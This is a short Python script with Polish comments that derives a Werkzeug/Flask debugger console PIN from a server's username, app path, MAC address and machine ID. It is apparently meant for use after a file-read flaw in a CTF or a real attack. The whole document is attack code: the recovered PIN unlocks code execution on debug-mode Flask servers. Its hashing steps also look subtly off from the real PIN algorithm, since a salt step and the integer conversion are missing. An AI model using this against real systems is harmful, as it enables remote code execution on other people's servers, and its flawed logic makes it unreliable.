import hashlib
from itertools import chain

def get_pin():
    # Dane publiczne
    public_bits = [
        'root',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.10/dist-packages/flask/app.py'
    ]

    # Dane prywatne (MAC i Machine ID)
    private_bits = [
        '2485832410124', # MAC dziesiętnie
        '55987c0d39b241b6929a14f3fa141c6cf5eb774507f2' # Machine ID
    ]

    rv = None
    num = hashlib.sha1()
    for bit in chain(public_bits, private_bits):
        if not bit: continue
        if isinstance(bit, str): bit = bit.encode('utf-8')
        num.update(bit)
    num.update(b'cookiesalt')

    for group in "".join(filter(str.isdigit, num.hexdigest())):
        rv = rv or ""
        rv += group
        if len(rv) == 9: break
    return f"{rv[:3]}-{rv[3:6]}-{rv[6:9]}"

print(f"Twój potencjalny PIN: {get_pin()}")
